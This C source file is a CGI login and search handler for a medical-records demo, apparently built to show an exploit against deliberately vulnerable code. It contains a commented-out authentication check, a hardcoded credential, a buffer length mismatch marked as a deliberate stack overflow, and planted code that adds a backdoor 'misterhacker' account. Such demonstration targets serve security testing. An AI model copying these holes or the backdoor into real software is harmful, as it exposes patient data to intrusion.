/*
 * File: login.c
 *
 * Description:
 *   Process the login form for the Draper medical demo.
 *
 * Copyright DornerWorks 2018
 *
 * Redistribution and use in source and binary forms, with or without modification,
 * are permitted provided that the following conditions are met:
 * 1.  Redistributions of source code must retain the above copyright notice, this
 * list of conditions and the following disclaimer.
 * 2.  Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation and/or
 * other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED ''AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 * INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
 * FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL DORNERWORKS
 * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE
 * GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF
 * THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include "http_statuses.h"
#include "database.h"
#include "cgi-args.h"
#include "cgi-util.h"
#include "auth.h"
#include "user.h"
#include "medical.h"
#include "FreeRTOS.h"


database_search_result_t * GetPatientSearchResult( char *cgistr );

database_search_result_t * GetDrSearchResult( char *cgistr );

CGI_FUNCTION(void, ShowSearchResult, database_search_result_t *search_result);

int not_stack_smash = 0;

BaseType_t CgiSearchResults( char *pcWriteBuffer, size_t xWriteBufferLen,
    char *pcHeaderBuffer, size_t xHeaderBufferLen,
    const char *pcCgiArgs )
{
  char session_id[KEY_SIZE_MAX] = { 0 };

  user_t *user;
  database_search_result_t *search_result;

  /* printf("in CgiSearchResults\n  parsing:\n"); */

  CgiArgValue(session_id, sizeof(session_id), "sessionId", pcCgiArgs);

  /* printf("    session_id: %s\n", session_id); */
  
  /* user = AuthCheckSessionId(session_id); */
  /* if (user == NULL) { */
  /*   return HTTP_UNAUTHORIZED; */
  /* } */

  user = UserCreate("user1", "password", "John", "Doe", "123 hello world");
  if(user == NULL) {
    return HTTP_INTERNAL_SERVER_ERROR;
  }
  MedicalSetPatient(user);

  if ( user->type == USER_DOCTOR )
    search_result = GetDrSearchResult(pcCgiArgs);
  else if ( user->type == USER_PATIENT )
    search_result = GetPatientSearchResult(pcCgiArgs);
  
  CGI_IMPL_CALL(ShowSearchResult, search_result);

  return HTTP_OK;
}

void parse_search_cgistr(char *pcCgiArgs, char *type, char *first_name,
			 char *last_name, char *address, char *condition) {

  char ltype[2];
  char lfirst_name[USER_NAME_LENGTH];
  char llast_name[USER_NAME_LENGTH];
  char laddress[USER_ADDRESS_LENGTH];
  char lcondition[MEDICAL_NAME_LENGTH];

  memset(ltype, '\0', sizeof(ltype));
  memset(lfirst_name, '\0', sizeof(lfirst_name));
  memset(llast_name, '\0', sizeof(llast_name));
  memset(laddress, '\0', sizeof(laddress));
  memset(lcondition, '\0', sizeof(lcondition));

  /* printf("in parse_search_cgistr helper\n"); */
  
  /* printf("  ltype @ 0x%x\n", ltype); */
  
  CgiArgValue(lfirst_name, USER_NAME_LENGTH, "firstname", pcCgiArgs);
  memcpy(first_name, lfirst_name, sizeof(lfirst_name));

  CgiArgValue(llast_name, USER_NAME_LENGTH, "lastname", pcCgiArgs);
  memcpy(last_name, llast_name, sizeof(llast_name));

  CgiArgValue(laddress, USER_ADDRESS_LENGTH, "address", pcCgiArgs);
  memcpy(address, laddress, sizeof(laddress));

  CgiArgValue(lcondition, MEDICAL_NAME_LENGTH, "condition", pcCgiArgs);
  memcpy(condition, lcondition, sizeof(lcondition));

  /* printf("    first name: %s\n", first_name); */
  /* printf("    last name: %s\n", last_name); */
  /* printf("    address: %s\n", address); */
  /* printf("    condition: %s\n", condition); */
  /*  */
  /* printf("gonna corrupt stack w bad ltype parse...\n"); */
  
  // bad length argument permits stack-based buffer overflow 
  CgiArgValue(ltype, USER_ADDRESS_LENGTH, "type", pcCgiArgs);

  return;
}

database_search_result_t *
GetPatientSearchResult( char *cgistr )
{

  char type[2];
  char first_name[USER_NAME_LENGTH];
  char last_name[USER_NAME_LENGTH];
  char address[USER_ADDRESS_LENGTH];
  char condition[MEDICAL_NAME_LENGTH];

  database_search_result_t *search_result;
  user_type_t search_type;

  printf("getting PATIENT search result\n");

  memset(type, '\0', sizeof(type));
  memset(first_name, '\0', sizeof(first_name));
  memset(last_name, '\0', sizeof(last_name));
  memset(address, '\0', sizeof(address));
  memset(condition, '\0', sizeof(condition));
  
  parse_search_cgistr(cgistr, type, first_name, last_name, address, condition);
  if(not_stack_smash) {
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("nop");
    __asm("addi s0, sp, 336");
    printf("Executing payload...\n");
    DatabaseAddUser(UserCreate("misterhacker", "password", "Mister", "Hacker", "555 Technology Square"));
  /* __asm("j 0x20405108"); */
  }

  /* printf("PATIENT search parsed:\n"); */
  /* printf("  first name = %s\n", first_name); */
  /* printf("  last name = %s\n", last_name); */
  /* printf("  address = %s\n", address); */
  /* printf("  condition = %s\n", condition); */
  
  search_type = atoi(type);

  /* printf("doing USER level search\n"); */
  search_result = DatabaseSearch(USER_PATIENT, search_type,
				 strlen(first_name) ? NULL : first_name ,
				 strlen(last_name)  ? NULL : last_name,
				 strlen(address)    ? NULL : address,
				 NULL);


  return search_result;
}

database_search_result_t *
GetDrSearchResult( char *cgistr )
{

  char type[2];
  char first_name[USER_NAME_LENGTH];
  char last_name[USER_NAME_LENGTH];
  char address[USER_ADDRESS_LENGTH];
  char condition[MEDICAL_NAME_LENGTH];

  printf("getting DOCTOR search result\n");
  
  database_search_result_t *search_result;
  user_type_t search_type;

  memset(type, '\0', sizeof(type));
  memset(first_name, '\0', sizeof(first_name));
  memset(last_name, '\0', sizeof(last_name));
  memset(address, '\0', sizeof(address));
  memset(condition, '\0', sizeof(condition));
  
  parse_search_cgistr(cgistr, type, first_name, last_name, address, condition);
  
  printf("DOCTOR search parsed:\n");
  printf("  first name = %s\n", first_name);
  printf("  last name = %s\n", last_name);
  printf("  address = %s\n", address);
  printf("  condition = %s\n", condition);

  search_type = atoi(type);

  printf("doing DOCTOR level search\n");
  search_result = DatabaseSearch(USER_DOCTOR, search_type,
				 strlen(first_name) ? NULL : first_name ,
				 strlen(last_name)  ? NULL : last_name,
				 strlen(address)    ? NULL : address,
				 NULL);

  
  return search_result;
}

CGI_FUNCTION(void, ShowSearchResult, database_search_result_t *search_result)
{
  database_search_result_node_t *node;
  char *user_full_name;

  CGI_PRINTF("<p>Retrieved %lu search result(s)</p>\n", search_result->count);

  if(search_result->count == 0) {
    return;
  }

  CGI_PRINTF("<table style=\"width:100%%\" align=\"left\">\n");

  CGI_PRINTF("<tr>\n");
  CGI_PRINTF("<th>Name</th>\n");
  CGI_PRINTF("<th>Address</th>\n");
  CGI_PRINTF("</tr>\n");

  for(node = search_result->head; node != NULL; node = node->next) {
    CGI_PRINTF("<tr>\n");

    user_full_name = UserFullName(node->user);
    if(user_full_name == NULL) {
      exit(EXIT_FAILURE);
    }

    CGI_PRINTF("<td>");
    /* CGI_PRINTF("<a href=\"user-details.cgi?username=%s&type=advanced\">", node->user->username); */
    /* CGI_CALL(HtmlEscape, user_full_name); */
    /* CGI_PRINTF("</a>"); */
    CGI_PRINTF("</td>\n");

    CGI_PRINTF("<td>");
    CGI_CALL(HtmlEscape, node->user->address);
    CGI_PRINTF("</td>\n");
    CGI_PRINTF("</tr>\n");

    free(user_full_name);
  }

  CGI_PRINTF("</table>\n");
}

void bad_stuff( void )
{
  DatabaseAddUser(UserCreate("misterhacker", "password", "aa", "aa", "aaaaaaaaa"));
  __asm("addi s0, sp, 352");
  /* __asm("j 0x20405108"); */

  /* goto EXPLOIT_DONE; */
}
